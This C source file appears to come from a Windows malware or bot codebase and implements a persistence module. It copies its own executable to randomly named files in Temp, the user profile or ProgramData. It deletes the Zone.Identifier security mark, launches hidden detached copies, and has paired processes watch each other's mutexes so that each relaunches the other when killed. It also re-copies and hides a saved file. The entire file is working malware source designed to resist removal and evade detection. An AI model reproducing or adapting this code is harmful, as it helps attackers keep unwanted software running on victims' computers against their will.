#include "../Includes/includes.h"

#ifdef INCLUDE_STARTUP_INSTALLATION_AND_PERSISTANCE
#ifndef INCLUDE_INJECTION
void MonitorBackupProcess()
{
    while(!bUninstallProgram)
    {
        if(CheckProgramMutexExistance(cBackupProcessMutex))
            break;

        Sleep(500);
    }

    while(!bUninstallProgram)
    {
        if(!CheckProgramMutexExistance(cBackupProcessMutex))
        {
            StartSisterProcessFromMainInstance();
            break;
        }

        Sleep(1000);
    }
}

DWORD WINAPI MonitorBackupProcessFromRecoveredInstance(LPVOID)
{
    MonitorBackupProcess();
    return 1;
}

void StartMonitorBackupProcessFromRecoveredInstance()
{
    while(TRUE)
    {
        HANDLE hThread = CreateThread(NULL, NULL, MonitorBackupProcessFromRecoveredInstance, NULL, NULL, NULL);
        if(hThread)
        {
            CloseHandle(hThread);
            break;
        }

        Sleep(500);
    }
}

DWORD WINAPI SisterProcessFromMainInstanceMainLoop(LPVOID)
{
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    memset(&si, 0 , sizeof(si));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cSisterProcessPath[MAX_PATH];
    unsigned short usRandNum = GetRandNum(100);
    if(usRandNum < 33)
        strcpy(cSisterProcessPath, cTempDirectory);
    else if(usRandNum < 66)
        strcpy(cSisterProcessPath, cUserProfile);
    else
    {
        if(dwOperatingSystem <= WINDOWS_XP)
            strcpy(cSisterProcessPath, cUserProfile);
        else
            strcpy(cSisterProcessPath, getenv("PROGRAMDATA"));
    }

    strcat(cSisterProcessPath, "\\");
    strcat(cSisterProcessPath, GenerateFilename(9));

    if(FileExists(cSisterProcessPath))
    {
        SetFileNormal(cSisterProcessPath);
        DeleteFile(cSisterProcessPath);
    }

    char cZoneIdentifier[MAX_PATH];

    strcpy(cZoneIdentifier, cThisFile);
    strcat(cZoneIdentifier, cZoneIdentifierSuffix);
    DeleteFile(cZoneIdentifier);

    CopyFile(cThisFile, cSisterProcessPath, FALSE);

    if(CreateProcess(NULL, cSisterProcessPath, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi))
    {
        MonitorBackupProcess();

        TerminateProcess(pi.hProcess, NULL);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else
    {
        StartSisterProcessFromMainInstance();
        return 0;
    }

    return 1;
}

void StartSisterProcessFromMainInstance()
{
    while(TRUE)
    {
        HANDLE hThread = CreateThread(NULL, NULL, SisterProcessFromMainInstanceMainLoop, NULL, NULL, NULL);
        if(hThread)
        {
            CloseHandle(hThread);
            break;
        }

        Sleep(500);
    }
}

void SisterProcessFromBackupInstanceMainBlockingLoop()
{
    while(!CheckProgramMutexExistance(cUninstallProcessMutex))
    {
        if(!CheckProgramMutexExistance(cMainProcessMutex))
        {
            if(FileExists(cFileSaved))
            {
                SetFileNormal(cFileSaved);
                DeleteFile(cFileSaved);
            }

            CopyFile(cThisFile, cFileSaved, FALSE);
            HideFile(cFileSaved);

            StartProcessFromPath(cFileSaved, TRUE);
        }

        Sleep(2500);
    }

    TerminateProcess((HANDLE)-1, 0);
}
#endif
#endif
